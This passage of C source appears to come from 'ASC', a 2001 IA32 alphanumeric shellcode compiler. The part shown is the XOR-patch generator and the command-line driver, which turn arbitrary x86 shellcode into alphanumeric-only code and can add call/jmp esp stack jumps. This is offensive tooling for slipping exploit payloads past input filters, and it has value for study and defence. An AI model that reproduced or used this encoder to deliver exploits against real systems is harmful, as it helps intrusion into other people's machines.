   XORsib32(s,base,EBP,disp8,reg); /* xor [base+2*ebp+disp8],edx/esi */
   break;
  }
 }

 return 0;
}


/* generate the patch and the original shellcode */
/* ============================================= */
int alphanumeric_patches_generate(struct Sshellcode *output,struct Sshellcode *input) {
 struct Sshellcode *out,*in; /* input and output codes */
 struct Sshellcode *best; /* last best shellcode */
 struct Sshellcode *patcher; /* patches code */
 int alpha_begin,alpha_end; /* offsets of the patchable part */
 int base; /* base register */
 unsigned char *disp8_begin; /* pointer to the current first disp8 */
 unsigned char disp8;
 int category,size,i,j;

 if (input==NULL) return -1;
 if (output==NULL) return -1;

 /* get the offset of the first and last non alphanumeric bytes */
 for (alpha_begin=0;alpha_begin<input->size;alpha_begin++) {
  if (!alphanumeric_check(input->opcodes[alpha_begin])) break;
 }
 if (alpha_begin>=input->size) { /* if patching is not needed */
  shellcode_cat(output,input);
  return 0;
 }
 for (alpha_end=input->size-1;alpha_end>alpha_begin;alpha_end--) {
  if (!alphanumeric_check(input->opcodes[alpha_end])) break;
 }

 base=alphanumeric_get_register(M_EBX|M_EDI);
 best=shellcode_malloc();
 disp8_begin=ALPHANUMERIC_BYTES;

 while (*disp8_begin!=0) { /* loop for all possible disp8 values */
  disp8=*disp8_begin;

  /* allocate all shellcodes */
  out=shellcode_malloc();
  shellcode_cpy(out,output);
  in=shellcode_malloc();
  shellcode_cpy(in,input);
  patcher=shellcode_malloc();

  i=alpha_begin;
  size=0;
  while (i<=alpha_end) { /* loop into our original shellcode */
   /* increment the offset if needed */
   for (j=0;j<size;j++) {
    if (alphanumeric_check(disp8+1)) {
     disp8++;
    }
    else INCr(patcher,base); /* inc base */
   }

   category=alphanumeric_patches_get_category(in->opcodes[i]);
   size=1; /* by default, we have 1 byte of the same category */

   /* loop until maximum 3 next bytes are from the same category */
   while ((i+size<=alpha_end)&&(size<4)&&(alphanumeric_patches_get_category(in->opcodes[i+size])==category)) size++;
   if (size==3) size=2; /* impossible to XOR 3 bytes */

   /* patch those bytes */
   alphanumeric_patches_generate_xor(patcher,category,&in->opcodes[i],size,base,disp8);

   i+=size;
  }

  alphanumeric_patches_generate_initialization(out,patcher->size,alpha_begin,
  base,*disp8_begin); /* create a valid initialization shellcode */

  shellcode_cat(out,patcher);
  shellcode_cat(out,in);

  if ((best->size==0)||(out->size<best->size)) shellcode_cpy(best,out);
  /* if this is a more interesting shellcode, we save it */

  /* free all shellcodes and malloc */
  shellcode_free(out);
  shellcode_free(in);
  shellcode_free(patcher);
  disp8_begin++;
 }

 shellcode_cpy(output,best);
 shellcode_free(best);
 return 0;
}

/******************************************************************************/

/* +------------------------------------------------------------------------+ */
/* |                          INTERFACE FUNCTIONS                           | */
/* +------------------------------------------------------------------------+ */

void print_syntax() {
 fprintf(stderr,"ASC - IA32 Alphanumeric Shellcode Compiler\n");
 fprintf(stderr,"==========================================\n");
 fprintf(stderr,"SYNTAX  : asc [options] <input file[.c]>\n");
 fprintf(stderr,"COMPILATION OPTIONS :\n");
 fprintf(stderr," -a[ddress] stack|<r32>     : address of shellcode (default=stack)\n");
 fprintf(stderr," -m[ode] stack|patches      : output shellcode build mode (default=patches)\n");
 fprintf(stderr," -s[tack] call|jmp|null|ret : method to return to original code on the stack\n");
 fprintf(stderr,"                              (default=null)\n");
 fprintf(stderr,"DEBUGGING OPTIONS :\n");
 fprintf(stderr," -debug-start               : breakpoint to start of compiled shellcode\n");
 fprintf(stderr," -debug-build-original      : breakpoint to building of original shellcode\n");
 fprintf(stderr," -debug-build-jump          : breakpoint to building of stack jump code\n");
 fprintf(stderr," -debug-jump                : breakpoint to stack jump\n");
 fprintf(stderr," -debug-original            : breakpoint to start of original shellcode\n");
 fprintf(stderr,"INPUT/OUTPUT OPTIONS :\n");
 fprintf(stderr," -c[har] <char[] name>      : name of C input array (default=first array)\n");
 fprintf(stderr," -f[ormat] bin|c            : output file format (default=bin)\n");
 fprintf(stderr," -o[utput] <output file>    : output file name (default=stdout)\n");



 fprintf(stderr,"\n");
 fprintf(stderr,"ASC 0.9.1                                                    rix@hert.org @2001\n");
 exit(1);
}


void print_error() {
 perror("Error ASC");
 exit(1);
};

/* +------------------------------------------------------------------------+ */
/* |                             MAIN PROGRAM                               | */
/* +------------------------------------------------------------------------+ */

#define STACK REGISTERS+1

#define INPUT_FORMAT_BIN 0
#define INPUT_FORMAT_C 1

#define OUTPUT_FORMAT_BIN 0
#define OUTPUT_FORMAT_C 1

#define OUTPUT_MODE_STACK 0
#define OUTPUT_MODE_PATCHES 1

#define STACK_MODE_CALL 0
#define STACK_MODE_JMP 1
#define STACK_MODE_NULL 2
#define STACK_MODE_RET 3


int main(int argc, char **argv) {
 char *input_filename=NULL,*output_filename=NULL;
 struct Sshellcode *input=NULL,*output=NULL,*stack=NULL;

 char input_format=INPUT_FORMAT_BIN;
 char *input_variable=NULL;
 char address=STACK;
 char output_format=OUTPUT_FORMAT_BIN;
 char output_mode=OUTPUT_MODE_PATCHES;
 char stack_mode=STACK_MODE_NULL;

 int debug_start=0;
 int debug_build_original=0;
 int debug_build_jump=0;
 int debug_jump=0;
 int debug_original=0;

 int ret,l;


 /* command line parameters definition */
 #define SHORT_OPTIONS "a:c:f:m:o:s:"
 struct option long_options[]={
  /* {"name",has_arg,&variable,value} */
  {"address",1,NULL,'a'},
  {"mode",1,NULL,'m'},
  {"stack",1,NULL,'s'},

  {"debug-start",0,&debug_start,1},
  {"debug-build-original",0,&debug_build_original,1},
  {"debug-build-jump",0,&debug_build_jump,1},
  {"debug-jump",0,&debug_jump,1},
  {"debug-original",0,&debug_original,1},

  {"char",1,NULL,'c'},
  {"format",1,NULL,'f'},
  {"output",1,NULL,'o'},

  {0,0,0,0}
 };
 int c;
 int option_index=0;


 /* read command line parameters */
 opterr=0;
 while ((c=getopt_long_only(argc,argv,SHORT_OPTIONS,long_options,&option_index))!=-1) {
  switch (c) {
  case 'a':
   if (!strcmp(optarg,"eax")) address=EAX;
   else if (!strcmp(optarg,"ebx")) address=EBX;
   else if (!strcmp(optarg,"ecx")) address=ECX;
   else if (!strcmp(optarg,"edx")) address=EDX;
   else if (!strcmp(optarg,"esp")) address=ESP;
   else if (!strcmp(optarg,"ebp")) address=EBP;
   else if (!strcmp(optarg,"esi")) address=ESI;
   else if (!strcmp(optarg,"edi")) address=EDI;
   else if (!strcmp(optarg,"stack")) address=STACK;
   else print_syntax();
   break;
  case 'c':
   input_format=INPUT_FORMAT_C;
   input_variable=optarg;
   break;
  case 'f':
   if (!strcmp(optarg,"bin")) output_format=OUTPUT_FORMAT_BIN;
   else if (!strcmp(optarg,"c")) output_format=OUTPUT_FORMAT_C;
   else print_syntax();
   break;
  case 'm':
   if (!strcmp(optarg,"stack")) output_mode=OUTPUT_MODE_STACK;
   else if (!strcmp(optarg,"patches")) output_mode=OUTPUT_MODE_PATCHES;
   else print_syntax();
   break;
  case 'o':
   output_filename=optarg;
   break;
  case 's':
   output_mode=OUTPUT_MODE_STACK;
   if (!strcmp(optarg,"call")) stack_mode=STACK_MODE_CALL;
   else if (!strcmp(optarg,"jmp")) stack_mode=STACK_MODE_JMP;
   else if (!strcmp(optarg,"null")) stack_mode=STACK_MODE_NULL;
   else if (!strcmp(optarg,"ret")) stack_mode=STACK_MODE_RET;
   else print_syntax();
   break;
  case 0: /* long option set variable */
   break;
  case '?': /* error option character */
  case ':': /* error option parameter */
  default:
   print_syntax();
  }
 }

 if (optind+1!=argc) print_syntax(); /* if no input file specified */
 input_filename=argv[optind];
 /* detect the input file format */
 l=strlen(input_filename);
 if ((l>2)&&(input_filename[l-2]=='.')&&(input_filename[l-1]=='c')) input_format=INPUT_FORMAT_C;

 random_initialize();
 input=shellcode_malloc();
 output=shellcode_malloc();


 /* read input file */
 if (debug_original) INT3(input);
 fprintf(stderr,"Reading %s ... ",input_filename);

 switch(input_format) {
 case INPUT_FORMAT_BIN:
  ret=shellcode_read_binary(input,input_filename);
  break;
 case INPUT_FORMAT_C:
  ret=shellcode_read_C(input,input_filename,input_variable);
  break;
 }
 if (ret==-1) {
  fprintf(stderr,"\n");
  print_error();
 }
 if (!debug_original) fprintf(stderr,"(%d bytes)\n",input->size);
 else fprintf(stderr,"(%d bytes)\n",input->size-1);


 if (debug_start) INT3(output);

 /* obtain the shellcode address */
 if (address==STACK) address=alphanumeric_get_address_stack(output);
 alphanumeric_initialize_registers(output,address);

 /* generate the original shellcode */
 if (debug_build_original) INT3(output);
 switch(output_mode) {
 case OUTPUT_MODE_STACK:
  alphanumeric_stack_generate(output,input);

  if (stack_mode!=STACK_MODE_NULL) { /* if jump building needed */
   stack=shellcode_malloc();
   if (debug_jump) INT3(stack);
   switch(stack_mode) {
   case STACK_MODE_CALL:
    CALL_ESP(stack);  /* call esp */
    break;
   case STACK_MODE_JMP:
    JMP_ESP(stack);   /* jmp esp */
    break;
   case STACK_MODE_RET:
    PUSHr(stack,ESP); /* push esp */
    RET(stack);       /* ret */
    break;
   }
   if (debug_build_jump) INT3(output);
   alphanumeric_patches_generate(output,stack);
   shellcode_free(stack);
  }
  else { /* no jump building needed */
   if (debug_jump) INT3(output);
  }
  break;

 case OUTPUT_MODE_PATCHES:
  alphanumeric_patches_generate(output,input);
  break;
 }


 /* print shellcode to the screen */
 fprintf(stderr,"Shellcode (%d bytes):\n",output->size);
 shellcode_print(output);
 fclose(stdout);
 fprintf(stderr,"\n");

 /* write input file */
 if (output_filename) {
  fprintf(stderr,"Writing %s ...\n",output_filename);

  switch(output_format) {
  case OUTPUT_FORMAT_BIN:
   ret=shellcode_write_binary(output,output_filename);
   break;
  case OUTPUT_FORMAT_C:
   ret=shellcode_write_C(output,output_filename);
   break;
  }
  if (ret==-1) {
   shellcode_free(input);
   shellcode_free(output);
   printf("HERE!\n");
   print_error();
  }
 }

 shellcode_free(input);
 shellcode_free(output);
 fprintf(stderr,"Done.\n");
}